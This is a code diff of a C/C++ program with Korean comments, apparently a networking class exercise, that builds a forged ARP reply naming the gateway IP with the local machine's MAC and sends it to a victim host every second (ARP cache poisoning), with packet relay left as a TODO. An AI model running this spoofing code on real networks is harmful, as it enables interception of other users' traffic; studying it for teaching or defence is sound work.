@@ -1,5 +1,34 @@
 #include "stdafx.h"
 
+int getMyMac(u_char* myMac, char* _interface){
+    struct ifreq s;
+    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
+
+    strcpy(s.ifr_name, _interface);
+    if(!ioctl(fd, SIOCGIFHWADDR, &s)){
+        //printf("\n");
+        for(int i =0; i<6; i++){
+            myMac[i] = s.ifr_addr.sa_data[i];
+            //printf("%x ", myMac[i]);
+        }
+    }
+    return 1;
+}
+
+int isARP(const uint8_t* pck){
+    if((pck[12] == 0x08) && (pck[13] == 0x06))
+        return 1;
+    else
+        return 0;
+}
+
+int isRep(const uint8_t* pck){
+    char OpIsRep = (pck[20]==0x00 && pck[21]==0x02);
+    if(OpIsRep){
+        return 1;
+    }
+    return 0;
+}
 
 int main(int argc, char *argv[]) {
     if (argc != 4) {
@@ -68,14 +97,17 @@ int main(int argc, char *argv[]) {
     // 구조체화 시키기
     arp_data.modifySenderMAC(myMac);
 
+    printf("---before sendpacket ---\n");
     pcap_sendpacket(handle, (const u_char*) &(arp_data.data), 42);
     while(true){
         if(pcap_next_ex(handle, &header, &packet)==0){
             continue;
         }
+
         //TODO packet을 rec_pck에 넣을 수 있게 함수구현해야할 것
-        //memcpy(rec_pck.data, packet, ARP_SIZE);
-        if(rec_pck.isARP() && rec_pck.isRep()){
+        rec_pck.initPacket((u_char*)packet);
+        if(isARP(packet) && isRep(packet)){
+            printf("Caught ARP-Reply packet\n");
             break;
         }
     }
@@ -83,32 +115,24 @@ int main(int argc, char *argv[]) {
     memcpy(SenderMAC, rec_pck.getSendMac(), MAC_SIZE);
     memcpy(DstMAC, rec_pck.getDstMac(), MAC_SIZE);
 
+    for(int i =0; i<6; i++){
+        printf("%X ", SenderMAC[i]);
+    }
+    printf("\n");
     arp_data.modifyETHSource(myMac);
     arp_data.modifySenderIP((u_char*)gateway_ip);
     arp_data.modifyTargetIP((u_char*)sender_ip);
     arp_data.modifyOP(ARP_REPLY);
-    arp_data.modifyTargetMAC(DstMAC);
-    arp_data.modifyETHDestination(DstMAC);
+    arp_data.modifyTargetMAC(SenderMAC);
+    arp_data.modifyETHDestination(SenderMAC);
 
-    printf("\nIP");
-
-    printf("\nPress ^c to Exit.");
+    printf("Press ^c to Exit.\n");
     while(true){
-        pcap_sendpacket(handle, (const u_char*) &(rec_pck.data), 42);
+        //arp reply패킷 전송
+        pcap_sendpacket(handle, (const u_char*) &(arp_data.data), 42);
         printf("packet send\n");
         sleep(1);
     }
+
+    //TODO relay packet 작성
 }
-/*
-          * 데스티네이션 상대
-          * 소스 자신
-          *
-          * 센더HA 자신
-          * 센더IP 43.1
-          * 타겟 HA 상대
-          * 타겟아이피 상대
-          */
-
-
-//계속보낼때
-// sender ip:
